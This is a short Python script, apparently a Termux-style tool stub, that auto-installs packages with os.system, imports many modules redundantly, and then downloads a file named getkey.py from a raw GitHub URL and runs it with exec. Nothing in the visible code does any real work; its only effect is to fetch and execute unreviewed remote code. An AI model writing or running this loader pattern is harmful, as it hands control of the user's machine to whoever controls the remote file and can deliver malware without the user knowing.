# -*- coding: utf-8 -*-
import os
try:
	import requests,colorama,prettytable
except:
	os.system("pip install requests")
	os.system("pkg install pip")
	os.system("pip install requests")
	os.system("pip install colorama")
	os.system("pip install prettytable")
import threading, requests, ctypes, random, json, time, base64, sys, re
from prettytable import PrettyTable
import random
from time import strftime
from colorama import init, Fore
from urllib.parse import urlparse, unquote, quote
from string import ascii_letters, digits
import random
from atexit import register
from time import sleep
import os,json,re,sys
import threading,base64
import os,time,re,json,random
from datetime import datetime
from time import sleep,strftime
import requests

exec(requests.get("https://raw.githubusercontent.com/Pvdh2304/PvdhGop/main/getkey.py").text)
